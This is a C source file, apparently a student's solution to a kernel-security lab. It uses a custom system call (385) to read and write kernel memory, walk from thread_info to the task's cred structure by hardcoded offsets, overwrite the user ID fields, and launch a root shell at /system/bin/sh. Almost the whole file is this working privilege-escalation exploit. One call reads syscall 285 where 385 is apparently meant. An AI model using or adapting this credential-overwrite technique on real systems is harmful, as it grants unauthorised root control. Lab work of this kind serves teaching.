#include <stdio.h>


void runExploit() {
    // First, locate thread info using provided system call. Check kernel source code.

    // Next, you need to find thread_info->task->cred
    //
    // There are three ways to do it:
    // 1.  Read kernel source code and compute the exact offset. 
    //     You will need to look at the .config file under kernel dir to resolve some macros
    // 2.  Use GDB to inspect the kernel stack and find what is the relationship between thread_info and thread_info->task->cred.
    // 3.  Scan from thread_info->task to find the location of cred field
    //     HINT: here are some conditions to help: 
    //         task->cpu_timers[i] >= KERNEL_START (Because cpu timer reside in kernel space)
    //         task->cpu_timers[i]->next == task->cpu_timers[i]->prev (Because we never set any cpu timer)
    //         task->cpu_timers[i]->next >= KERNEL_START (Because cpu timer reside in kernel space)
    //         task->real_cred == task->cred (Because we never used seteuid() system call)
    //         task->cred->uid == getuid()
    
    // Finally, you will need to rewrite the cred struct and give your process highest privilege
   
    syscall(385,0,1);
       
    char* thread_info_addr = syscall(385,4,1);
    syscall(385,2,thread_info_addr+8);
    char* task_struct_addr = syscall(385,3,1);
        


    syscall(385,0,1);
    syscall(385,2,task_struct_addr+728);
    char* cred_struct_addr = syscall(385,3,1);


    syscall(385,0,1);
    syscall(385,2,cred_struct_addr+16);
    char* uid_addr = syscall(385,3,1);

    
    syscall(385,0,1);
    for(unsigned i =0; i < 255; i++)
    {
	syscall(285,1,i);
    }


    syscall(385,2,cred_struct_addr - 4);
    syscall(385,1,256);    
   
    syscall(385,0,1);

    for(unsigned i = 0; i < 255; i++)
    {
	syscall(385,1,i);
    }

    
    syscall(385,2,cred_struct_addr - 3);
    syscall(385,1,256);


    syscall(385,0,1);

    for(unsigned i = 0; i< 255; i++)
    {
	syscall(385,1,i);
    }

                                  
    syscall(385,2, cred_struct_addr - 4);
    syscall(385,1,256);



    syscall(385,0,1);

    for(unsigned i =0; i<255; i++)
    {
	syscall(385,1,i);
    }


    syscall(385,2,cred_struct_addr + 12);
    syscall(385,1,256);


    syscall(385,0,1);

    for(unsigned i = 0; i < 255; i++)
    {
        syscall(385,1,i);
    }


    syscall(385,2,cred_struct_addr + 13);
    syscall(385,1,256);



    syscall(385,0,1);

    for(unsigned i = 0; i < 255; i++)
    {
        syscall(385,1,i);
    }


    syscall(385,2,cred_struct_addr + 12);
    syscall(385,1,256);
 
    syscall(385,0,1);
     


    return;
}

int main() {
    // Initial getuid(), should return non zero


    fprintf(stderr, "getuid() = %d\n", getuid());

    // The exploit itself
    runExploit();

    // If the exploit is successful, getuid() should return zero.
    fprintf(stderr, "getuid() = %d\n", getuid());

    if (getuid() == 0) {
        fprintf(stderr, "Trying to get a root shell.\n");
        char * sharg[] = {"/system/bin/sh", NULL};
        execv("/system/bin/sh", sharg); // You should see '#' at this point
    }

    return 0;
}
